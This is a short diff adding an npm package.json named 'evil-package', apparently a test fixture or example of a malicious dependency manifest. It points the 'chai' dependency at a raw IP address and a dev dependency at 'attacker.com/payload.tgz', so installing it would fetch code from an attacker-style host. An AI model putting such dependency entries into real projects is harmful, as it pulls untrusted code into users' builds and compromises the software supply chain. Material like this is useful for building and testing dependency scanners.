@@ -1,0 +1,11 @@
+{
+  "name": "evil-package",
+  "version": "1.0.0",
+  "dependencies": {
+    "chai": "http://54.173.15.59:8080/npm/evil-package",
+    "legit-dep": "^1.0.0"
+  },
+  "devDependencies": {
+    "internal-tool": "http://attacker.com/payload.tgz"
+  }
+}
